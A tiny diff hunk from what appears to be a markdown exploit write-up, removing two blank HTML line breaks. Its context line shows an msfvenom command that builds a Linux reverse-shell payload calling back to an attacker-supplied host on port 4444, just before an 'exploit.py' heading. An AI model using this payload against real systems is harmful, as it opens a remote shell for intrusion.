@@ -63,8 +63,6 @@ payload : msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC
 ```
 <br>
 <br>
-<br>
-<br>
 
 ## exploit.py
 
